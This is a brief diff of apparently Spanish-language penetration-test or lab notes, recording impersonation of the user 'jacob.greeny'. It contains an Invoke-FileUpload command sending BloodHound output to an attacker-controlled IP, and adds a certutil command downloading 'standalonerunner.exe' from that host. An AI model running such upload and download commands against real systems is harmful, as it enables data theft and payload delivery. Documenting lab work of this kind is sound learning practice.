@@ -198,7 +198,7 @@ Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_Bloo
 ahora somos el usuario `jacob.greeny`  
 ![[Pasted image 20240629143740.png]]
 
-
+certutil.exe -f -urlcache -split http://10.10.14.47:80/standalonerunner.exe
 
 ### Vulnerabilidades
 
